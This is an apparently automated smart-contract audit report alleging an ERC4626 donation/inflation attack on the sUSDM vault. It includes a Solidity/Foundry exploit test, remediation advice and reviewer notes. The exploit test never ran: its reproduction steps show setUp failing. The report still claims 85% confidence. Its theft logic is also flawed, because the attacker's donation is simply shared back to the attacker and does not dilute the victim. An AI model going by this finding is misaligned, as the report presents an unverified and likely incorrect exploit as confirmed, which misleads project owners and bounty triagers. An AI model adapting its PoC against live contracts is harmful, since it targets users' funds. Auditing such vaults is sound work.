**Scope:** ⚠️ below paid tier — Severity 'medium' is often below the paid tier (many programs pay only High/Critical for smart contracts). Verify program tiers.

# sUSDM totalAssets() includes direct USDM donations — Vault yield injection calculated on inflated base steals from new depositors

**Severity:** Medium  
**Confidence:** 85%  
**Affected:** sUSDM.totalAssets, sUSDM.injectYield, MonetrixVault.distributeYield

## Summary
sUSDM.totalAssets() returns the raw USDM balance of the contract via IERC20(asset()).balanceOf(address(this)), making the exchange rate manipulable by direct USDM donations. An attacker with existing shares can inflate totalAssets() without minting new shares, causing subsequent depositors to receive fewer shares than fair value while the attacker captures the difference upon redemption.

## Vulnerability Detail
The root cause lies in sUSDM.totalAssets(), which computes the vault's asset value as IERC20(asset()).balanceOf(address(this)) — the raw USDM token balance held by the sUSDM contract. This implementation makes no distinction between USDM received through legitimate deposit/yield-injection flows and USDM sent via arbitrary external transfers. Because the ERC4626 share price is derived from totalAssets() / totalSupply(), any direct USDM transfer to the sUSDM contract inflates totalAssets() without a corresponding increase in totalSupply(), artificially raising the exchange rate. The MonetrixVault.distributeYield() and sUSDM.injectYield() functions rely on totalAssets() to determine yield amounts, meaning a manipulated balance propagates into incorrect yield calculations. No dead-shares mechanism, virtual offset, or internal balance-tracking exists to decouple the reported asset value from the raw token balance, leaving the contract fully exposed to the classic ERC4626 donation/inflation attack vector.

## Impact
An attacker who holds existing sUSDM shares can donate USDM directly to the sUSDM contract immediately before a large deposit occurs. The inflated totalAssets() causes the new depositor to receive fewer shares than the fair market value of their USDM contribution. When the attacker subsequently redeems their shares at the artificially elevated exchange rate, they extract USDM that economically belongs to the new depositor. This results in direct, quantifiable financial loss to any user depositing into sUSDM after the donation, and undermines the integrity of MonetrixVault.distributeYield() which bases injection amounts on the manipulated totalAssets() figure. The attack is low-cost (only requires USDM equal to the desired extraction amount) and can be repeated across multiple deposit cycles.

## Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/governance/MonetrixAccessController.sol";

contract AuditAgentPoC is Test {
    MonetrixAccessController acl;
    USDM usdmToken;
    MonetrixConfig config;
    sUSDM susdmVault;

    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        acl = new MonetrixAccessController();
        acl.initialize(address(this));

        usdmToken = new USDM();
        usdmToken.initialize(address(acl));

        config = new MonetrixConfig();
        config.initialize(address(0), address(this), address(acl));

        susdmVault = new sUSDM();
        susdmVault.initialize(address(usdmToken), address(config), address(acl));

        // Allow test contract to mint USDM
        usdmToken.setVault(address(this));
    }

    function test_exploit() public {
        // ATTACK TIMELINE:
        // 1. [Setup] Deploy contracts, fund accounts
        // 2. [T=1] Attacker deposits 100k USDM into sUSDM to get initial shares
        // 3. [T=2] Attacker donates 100k USDM directly to sUSDM contract, inflating totalAssets()
        // 4. [T=3] Victim deposits 100k USDM, receiving fewer shares due to artificially high exchange rate
        // 5. [Assert] Verify attacker's shares are now worth more than their initial deposit (stole from victim)

        uint256 initialDeposit = 100_000e6;
        uint256 donation = 100_000e6;
        uint256 victimDeposit = 100_000e6;

        // Step 1: Attacker deposits initial amount
        usdmToken.mint(attacker, initialDeposit);
        vm.prank(attacker);
        usdmToken.approve(address(susdmVault), initialDeposit);
        
        vm.prank(attacker);
        uint256 attackerShares = susdmVault.deposit(initialDeposit, attacker);
        console.log("Step 1: Attacker shares =", attackerShares);

        // Step 2: Attacker donates USDM directly to sUSDM
        usdmToken.mint(attacker, donation);
        vm.prank(attacker);
        usdmToken.transfer(address(susdmVault), donation);
        
        uint256 assetsAfterDonation = susdmVault.totalAssets();
        console.log("Step 2: sUSDM totalAssets after donation =", assetsAfterDonation);
        assertEq(assetsAfterDonation, initialDeposit + donation, "totalAssets should include direct donation");

        // Step 3: Victim deposits USDM
        usdmToken.mint(victim, victimDeposit);
        vm.prank(victim);
        usdmToken.approve(address(susdmVault), victimDeposit);
        
        vm.prank(victim);
        uint256 victimShares = susdmVault.deposit(victimDeposit, victim);
        console.log("Step 3: Victim shares =", victimShares);

        // Step 4: Assert attacker profited from the inflated exchange rate
        uint256 totalAssetsFinal = susdmVault.totalAssets();
        uint256 totalSupplyFinal = susdmVault.totalSupply();
        
        // Attacker's share value = (attackerShares * totalAssets) / totalSupply
        uint256 attackerShareValue = (attackerShares * totalAssetsFinal) / totalSupplyFinal;
        console.log("Step 4: Attacker share value =", attackerShareValue);
        
        assertGt(attackerShareValue, initialDeposit, "Attacker profited from victim's deposit due to inflated exchange rate");
        assertLt(victimShares, attackerShares, "Victim received fewer shares than attacker for the same deposit amount");
    }
}
```

### Reproduction Steps
1. [FAIL: InvalidInitialization()] setUp() (gas: 0)
2. [FAIL: InvalidInitialization()] setUp() (gas: 0)

## Recommendation
Replace the raw balance-of query in sUSDM.totalAssets() with an internally tracked asset accounting variable that is only incremented through authorized deposit and yield-injection paths. Specifically: (1) Introduce an internal uint256 _totalAssets variable in sUSDM that is updated exclusively within deposit(), withdraw(), injectYield(), and related state-changing functions. (2) Return _totalAssets from totalAssets() instead of IERC20(asset()).balanceOf(address(this)). (3) Alternatively, implement the OpenZeppelin ERC4626 virtual shares/offset pattern (e.g., adding a virtual offset of 10^decimals to both assets and shares in the exchange rate calculation) to make the attack economically unviable by ensuring the exchange rate cannot be meaningfully skewed by small donations. (4) Add a sanity check or event emission when the raw balance diverges from the tracked balance to detect unauthorized direct transfers.

## Skeptic Notes
The source code confirms sUSDM.totalAssets() returns IERC20(asset()).balanceOf(address(this)) — the raw USDM balance with no mechanism to distinguish legitimate yield injections from arbitrary external donations. USDM transfers to sUSDM are unrestricted. This is the classic ERC4626 donation/inflation attack: an attacker with existing shares can donate USDM directly to sUSDM, inflating totalAssets() and the exchange rate, causing subsequent depositors to receive fewer shares. The attacker's existing shares capture value from the new depositor's unfavorable entry rate. No dead-shares mechanism, virtual offset, or balance tracking exists to mitigate this. The PoC failed due to test setup (InvalidInitialization), not because the vulnerability is absent from the source code.
